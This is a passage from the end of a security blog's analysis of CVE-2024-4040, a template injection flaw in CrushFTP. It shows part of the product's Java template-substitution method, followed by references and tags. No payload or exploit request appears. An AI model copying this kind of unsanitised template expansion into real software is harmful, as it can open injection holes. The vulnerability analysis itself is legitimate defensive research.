</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_file_transfer_mode&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;file_transfer_mode&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_sfv&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0 <span style="color:#f92672">||</span> in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_md5&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0) {
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> in_str.<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">&#34;CRC32&#34;</span>, <span style="color:#e6db74">&#34;MD5&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (user_info <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
</span></span><span style="display:flex;"><span>            in_str <span style="color:#f92672">=</span> in_str.<span style="color:#a6e22e">replaceAll</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_md5&#34;</span> <span style="color:#f92672">+</span> r2, user_info.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;md5&#34;</span>)); 
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (user_info <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>)
</span></span><span style="display:flex;"><span>            in_str <span style="color:#f92672">=</span> in_str.<span style="color:#a6e22e">replaceAll</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_sfv&#34;</span> <span style="color:#f92672">+</span> r2, user_info.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;md5&#34;</span>)); 
</span></span><span style="display:flex;"><span>        } 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_time_remaining&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0) {
</span></span><span style="display:flex;"><span>            String time_str <span style="color:#f92672">=</span> String.<span style="color:#a6e22e">valueOf</span>(uLG(user_info, <span style="color:#e6db74">&#34;seconds_remaining&#34;</span>)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; secs&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (uLG(user_info, <span style="color:#e6db74">&#34;seconds_remaining&#34;</span>) <span style="color:#f92672">==</span> 0L)
</span></span><span style="display:flex;"><span>              time_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;None Active&gt;&#34;</span>; 
</span></span><span style="display:flex;"><span>            user_info.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;last_time_remaining&#34;</span>, time_str);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (uLG(user_info, <span style="color:#e6db74">&#34;seconds_remaining&#34;</span>) <span style="color:#f92672">&gt;</span> 60L)
</span></span><span style="display:flex;"><span>              time_str <span style="color:#f92672">=</span> String.<span style="color:#a6e22e">valueOf</span>(uLG(user_info, <span style="color:#e6db74">&#34;seconds_remaining&#34;</span>) <span style="color:#f92672">/</span> 60L) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;min, &#34;</span> <span style="color:#f92672">+</span> (uLG(user_info, <span style="color:#e6db74">&#34;seconds_remaining&#34;</span>) <span style="color:#f92672">-</span> uLG(user_info, <span style="color:#e6db74">&#34;seconds_remaining&#34;</span>) <span style="color:#f92672">/</span> 60L <span style="color:#f92672">*</span> 60L) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; secs&#34;</span>; 
</span></span><span style="display:flex;"><span>            in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_time_remaining&#34;</span> <span style="color:#f92672">+</span> r2, time_str);
</span></span><span style="display:flex;"><span>            user_info.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;last_time_remaining&#34;</span>, time_str);
</span></span><span style="display:flex;"><span>          } 
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_time_remaining&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user_info, <span style="color:#e6db74">&#34;last_time_remaining&#34;</span>));
</span></span><span style="display:flex;"><span>        } 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_paused&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_paused&#34;</span> <span style="color:#f92672">+</span> r2, uBG(user_info, <span style="color:#e6db74">&#34;pause_now&#34;</span>) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;!PAUSED!&#34;</span> : <span style="color:#e6db74">&#34;&#34;</span>); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_bytes_remaining&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_bytes_remaining&#34;</span> <span style="color:#f92672">+</span> r2, uLG(user_info, <span style="color:#e6db74">&#34;file_length&#34;</span>) <span style="color:#f92672">-</span> uLG(user_info, <span style="color:#e6db74">&#34;bytes_sent&#34;</span>) <span style="color:#f92672">-</span> uLG(user_info, <span style="color:#e6db74">&#34;start_transfer_byte_amount&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_pasv_port&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_pasv_port&#34;</span> <span style="color:#f92672">+</span> r2, uIG(user_info, <span style="color:#e6db74">&#34;PASV_port&#34;</span>)); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_ratio&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_ratio&#34;</span> <span style="color:#f92672">+</span> r2, uSG(user, <span style="color:#e6db74">&#34;ratio&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; to 1&#34;</span>); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_perm_ratio&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_perm_ratio&#34;</span> <span style="color:#f92672">+</span> r2, uBG(user, <span style="color:#e6db74">&#34;perm_ratio&#34;</span>) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;Yes&#34;</span> : <span style="color:#e6db74">&#34;No&#34;</span>); 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (in_str.<span style="color:#a6e22e">indexOf</span>(String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_reverse_ip&#34;</span> <span style="color:#f92672">+</span> r2) <span style="color:#f92672">&gt;=</span> 0)
</span></span><span style="display:flex;"><span>          in_str <span style="color:#f92672">=</span> Common.<span style="color:#a6e22e">replace_str</span>(in_str, String.<span style="color:#a6e22e">valueOf</span>(r1) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;user_reverse_ip&#34;</span> <span style="color:#f92672">+</span> r2, InetAddress.<span style="color:#a6e22e">getByName</span>(uSG(user, <span style="color:#e6db74">&#34;user_ip&#34;</span>)).<span style="color:#a6e22e">getHostName</span>()); 
</span></span><span style="display:flex;"><span>        r1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{&#34;</span>;
</span></span><span style="display:flex;"><span>        r2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;}&#34;</span>;
</span></span><span style="display:flex;"><span>      } 
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>      Log.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;SERVER&#34;</span>, 2, e);
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> in_str;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><h3 id="references">References:</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4040">https://nvd.nist.gov/vuln/detail/CVE-2024-4040</a></li>
<li><a href="https://attackerkb.com/topics/20oYjlmfXa/cve-2024-4040/rapid7-analysis">https://attackerkb.com/topics/20oYjlmfXa/cve-2024-4040/rapid7-analysis</a></li>
<li><a href="https://github.com/airbus-cert/CVE-2024-4040">https://github.com/airbus-cert/CVE-2024-4040</a></li>
<li><a href="https://www.crushftp.com/crush10wiki/Wiki.jsp?page=Update">https://www.crushftp.com/crush10wiki/Wiki.jsp?page=Update</a></li>
<li><a href="https://www.rapid7.com/blog/post/2024/04/23/etr-unauthenticated-crushftp-zero-day-enables-complete-server-compromise/">https://www.rapid7.com/blog/post/2024/04/23/etr-unauthenticated-crushftp-zero-day-enables-complete-server-compromise/</a></li>
<li><a href="https://www.bleepingcomputer.com/news/security/crushftp-warns-users-to-patch-exploited-zero-day-immediately/">https://www.bleepingcomputer.com/news/security/crushftp-warns-users-to-patch-exploited-zero-day-immediately/</a></li>
</ul>

		</div>
		<footer class="post__footer">
			
<div class="post__tags tags clearfix">
	<svg class="tags__badge icon icon-tag" width="16" height="16" viewBox="0 0 32 32"><path d="M4 0h8s2 0 4 2l15 15s2 2 0 4L21 31s-2 2-4 0L2 16s-2-2-2-4V3s0-3 4-3m3 10a3 3 0 0 0 0-6 3 3 0 0 0 0 6"/></svg>
	<ul class="tags__list">
		<li class="tags__item">
			<a class="tags__link btn" href="/tags/cve-2024-4040/" rel="tag">cve-2024-4040</a>
		</li>
		<li class="tags__item">
			<a class="tags__link btn" href="/tags/java/" rel="tag">Java</a>
		</li>
		<li class="tags__item">
			<a class="tags__link btn" href="/tags/ssti/" rel="tag">SSTI</a>
		</li>
		<li class="tags__item">
			<a class="tags__link btn" href="/tags/rce/" rel="tag">RCE</a>
		</li>
	</ul>
</div>
		</footer>
	</article>
</main>



<nav class="pager flex">
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/ivanti-endpoint-manager-xxe-cve-2024-37397/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">CVE 2024-37397 - Ivanti Endpoint Manager XXE Vulnerability</p>
		</a>
	</div>
</nav>


			</div>
			<aside class="sidebar"><div class="widget-search widget">
	<form class="widget-search__form" role="search" method="get" action="https://google.com/search">
		<input class="widget-search__field" type="search" placeholder="Search…" value="" name="q" aria-label="Search…">
		<input class="widget-search__submit" type="submit" value="Search">
		<input type="hidden" name="sitesearch" value="http://localhost:1313/">
	</form>
</div>
<div class="widget-recent widget">
	<h4 class="widget__title">Recent Posts</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item"><a class="widget__link" href="/posts/crushftp-cve-2025-2825/">CVE 2025-2825 - CrushFTP Authentication Bypass Analysis</a></li>
			<li class="widget__item"><a class="widget__link" href="/posts/hpe-irs-cve-deep-dive/">Exploring Recent CVEs in HPE Insight Remote Support</a></li>
			<li class="widget__item"><a class="widget__link" href="/posts/ivanti-endpoint-manager-xxe-cve-2024-37397/">CVE 2024-37397 - Ivanti Endpoint Manager XXE Vulnerability</a></li>
			<li class="widget__item"><a class="widget__link" href="/posts/crushftp-cve-2024-4040/">CVE 2024-4040 - CrushFTP Server-Side Template Injection Vulnerability Analysis</a></li>
		</ul>
	</div>
</div>
<div class="widget-categories widget">
	<h4 class="widget__title">Categories</h4>
	<div class="widget__content">
		<ul class="widget__list">
			<li class="widget__item">
				<a class="widget__link" href="/categories/1day-breakdown/">1Day Breakdown</a></li>
			<li class="widget__item">
				<a class="widget__link" href="/categories/cve-analysis/">CVE Analysis</a></li>
		</ul>
	</div>
</div>
<div class="widget-taglist widget">
	<h4 class="widget__title">Tags</h4>
	<div class="widget__content">
		<a class="widget-taglist__link widget__link btn" href="/tags/java/" title="Java">Java (3)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/rce/" title="RCE">RCE (2)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/xxe/" title="XXE">XXE (2)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/.net/" title=".NET">.NET (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/1day/" title="1day">1day (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/auth-bypass/" title="Auth-Bypass">Auth-Bypass (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/crushftp/" title="CrushFTP">CrushFTP (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-37297/" title="CVE-2024-37297">CVE-2024-37297 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-4040/" title="Cve-2024-4040">Cve-2024-4040 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-53675/" title="CVE-2024-53675">CVE-2024-53675 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2024-53676/" title="CVE-2024-53676">CVE-2024-53676 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/cve-2025-2825/" title="CVE-2025-2825">CVE-2025-2825 (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/example/" title="Example">Example (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/exploit-development/" title="Exploit-Development">Exploit-Development (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/logic-flaw/" title="Logic-Flaw">Logic-Flaw (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/oob-xxe/" title="OOB-XXE">OOB-XXE (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/path-traversal/" title="Path Traversal">Path Traversal (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/ssti/" title="SSTI">SSTI (1)</a>
		<a class="widget-taglist__link widget__link btn" href="/tags/vulnerability-research/" title="Vulnerability-Research">Vulnerability-Research (1)</a>
	</div>
</div>

</aside>
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2025 PwnFuzz - Security Research &amp; Exploit Development.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
	</div>
<script async defer src="/js/menu.js"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML" async></script>
</body>
</html>